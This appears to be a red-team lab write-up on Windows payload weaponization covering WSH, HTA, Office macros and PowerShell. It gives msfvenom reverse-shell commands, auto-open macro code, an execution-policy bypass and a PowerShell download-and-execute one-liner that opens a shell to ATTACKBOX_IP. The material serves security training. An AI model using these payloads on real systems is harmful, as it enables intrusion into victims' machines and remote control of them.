
# Weaponization

Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.

For more information about red team toolkits, please visit the following: a [GitHub repository](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development) that has it all, including initial access, payload development, delivery methods, and others.

Most organizations block or monitor the execution of .exe files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:

* The Windows Script Host (WSH)
* An HTML Application (HTA)
* Visual Basic Applications (VBA)
* PowerShell (PSH)

## Windows Scripting Host - WSH

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, `cscript.exe` (for command-line scripts) and `wscript.exe` (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including `vbs` and `vbe`. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript). It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

Now let's write a simple VBScript code to create a windows message box that shows the `Welcome to THM` message. Make sure to save the following code into a file, for example, `hello.vbs`.

```
Dim message 
message = "Welcome to THM"
MsgBox message
```

`wscript hello.vbs`

Now let's use the VBScript to run executable files. The following vbs code is to invoke the Windows calculator, proof that we can execute .exe files using the `Windows native engine (WSH)`.

```
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True

```
`c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs`

We can also run it via `cscript` as follows,

`c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs`

As a result, the Windows calculator will appear on the Desktop.

### 1.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

#### Another trick. If the VBS files are `blacklisted`, then we can rename the file to `.txt` file and run it using `wscript` as follows,

`c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt`

#### We can replace the calc.exe to cmd.exe to open as a current user.

-------------------------------------------------------

## An HTML Application - HTA

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic `HTML` pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool `mshta` is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 

In the following example, we will use an [ActiveXObject](https://en.wikipedia.org/wiki/ActiveX) in our payload as proof of concept to execute `cmd.exe`. Consider the following HTML code.

``` HTML
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,

`python3 -m http.server 8090`

On the victim machine, visit the malicious link using Microsoft Edge, http://Attacker-IP:8090/payload.hta. Note that the 10.8.232.37 is the AttackBox's IP address.

### 2.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Once we press `Run`, the `payload.hta` gets executed, and then it will invoke the `cmd.exe`. The following figure shows that we have successfully executed the `cmd.exe`.

### HTA Reverse Connection

We can create a reverse shell payload as follows,

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta`

### Malicious HTA via Metasploit

There is another way to generate and serve malicious HTA files using the Metasploit framework. First, run the Metasploit framework using `msfconsole -q` command. Under the exploit section, there is `exploit/windows/misc/hta_server`, which requires selecting and setting information such as `LHOST`, `LPORT`, `SRVHOST`, `Payload`, and finally, executing `exploit` to run the module.

On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.

-------------------------------------------------------

## Visual Basic for Application - VBA

Visual Basic for Application (VBA)

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications. 

Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA's features is accessing the Windows Application Programming Interface (API) and other low-level functionality. For more information about VBA, visit [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications). 

In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents.

Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.

### 3.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Now create a new blank Microsoft document to create our first `macro`. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting `view → macros`. The Macros window shows to create our own macro within the document.

### 4.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

In the `Macro name` section, we choose to name our macro as `THM`. Note that we need to select from the `Macros in` list `Document1` and finally select `create`. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message: `Welcome to Weaponization Room!`. We can do that using the `MsgBox` function as follows:

```
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```
Finally, run the macro by `F5` or `Run` → `Run Sub/UserForm`.

Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as `AutoOpen` and `Document_open`. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the `THM` function.

```
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```
It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as `.doc and docm`. Now let's save the file as `Word 97-2003 Template` where the Macro is enabled by going to `File → save Document1` and save as `type → Word 97-2003 Document` and finally, `save`.

### 5.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Let's close the Word document that we saved. If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been `disabled` and give us the option to enable it. Let's enable it and move forward to check out the result.

### 6.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Once we allowed the `Enable Content`, our macro gets executed as shown,

### 7.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

### Now edit the word document and create a macro function that executes a calc.exe or any executable file as proof of concept as follows,

```
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```
To explain the code in detail, with `Dim payload As String`, we declare payload variable as a string using Dim keyword. With `payload = "calc.exe"` we are specifying the payload name and finally with `CreateObject("Wscript.Shell")`.Run payload we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the  `AutoOpen()` and `Document_open()` functions too.

Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create `AutoOpen()` and `Document_open()` functions before saving the document. Once the code works, now save the file and try to open it again.

### 8.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.

### Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell.

Note that we specify the payload as VBA to use it as a macro.

` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba`

**Import to note** that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the `Workbook_Open()` to `Document_Open()` to make it suitable for MS word documents.

Now copy the output and save it into the macro editor of the MS word document, as we showed previously.

From the attacking machine, run the Metasploit framework and set the listener as follows:

### 9.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.

-------------------------------------------------------

## PowerShell - PSH

PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, [Hacking with PowerShell for more information about PowerShell](https://tryhackme.com/room/powershell).

Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints "Welcome to the Weaponization Room!" as follows,

```
Write-Output "Welcome to the Weaponization Room!"
```
Save the file as `thm.ps1`. With the `Write-Output`, we print the message "Welcome to the Weaponization Room!" to the command prompt. Now let's run it and see the result.

`C:\Users\thm\Desktop>powershell -File thm.ps1`

### Execution Policy

PowerShell's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts `.ps1` for security purposes. The PowerShell execution policy is set to `Restricted`, which means it permits individual commands but not run any scripts.

You can determine the current PowerShell setting of your Windows as follows,

`PS C:\Users\thm> Get-ExecutionPolicy`

We can also easily change the PowerShell execution policy by running:

`PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`

### Bypass Execution Policy

Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to `bypass` policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.

`C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1`

#### Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. 

On your AttackBox, download it from GitHub and run a webserver to deliver the payload.

`user@machine$ git clone https://github.com/besimorhino/powercat.git`

Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080.

```
user@machine$ cd powercat
user@machine$ python3 -m http.server 8080
```
On the AttackBox, we need to listen on port `1337` using `nc` to receive the connection back from the victim.

`user@machine$ nc -lvp 1337`

Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,

`C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"`

After a couple of seconds, we should receive the connection call back:

### 10.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

-------------------------------------------------------

## Command And Control - (C2 Or C&C)

What is Command and Control (C2)?

C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to:

* Generate various malicious payloads
* Enumerate the compromised machine/networks
* Perform privilege escalation and pivoting
* Lateral movement 
* And many others


Some popular C2 frameworks that we'll briefly highlight are `Cobalt Strike`, `PowerShell Empire`, `Metasploit`. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system.

-------------------------------------------------------

##  Delivery Techniques

Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.

* Email Delivery
* Web Delivery
* USB Delivery
-------------------------------------------------------